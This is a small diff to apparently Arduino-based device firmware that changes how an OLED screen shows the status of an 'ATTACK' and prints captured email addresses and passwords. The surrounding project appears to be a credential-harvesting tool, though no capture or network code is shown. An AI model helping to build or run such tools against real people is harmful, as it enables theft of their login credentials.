@@ -243,22 +243,28 @@ void wait_for_stop()
     {
       display.setCursor(0, 0);
       display.println("Successful");
+
       if (capturedEmail != "")
       {
-        display.println("Email: " + capturedEmail);
-        display.println("Password: " + capturedPassword);
+        display.println("Email:");
+        display.println(capturedEmail);
+        display.println("Pass:");
+        display.println(capturedPassword);
       }
       else
       {
-        display.println("Password: " + capturedPassword);
-        display.println("-> SELECT to stop");
+        display.println("Pass:");
+        display.println(capturedPassword);
       }
+      display.setCursor(0, 50);
+      display.println("-> SELECT to stop");
     }
     
     else 
     {
       display.setCursor(0, 0);
       display.println("ATTACK...");
+      display.drawLine(0, 9, SCREEN_WIDTH - 1, 9, SSD1306_WHITE);
       display.setCursor(0, 32);
       display.println("-> SELECT to stop");
     }
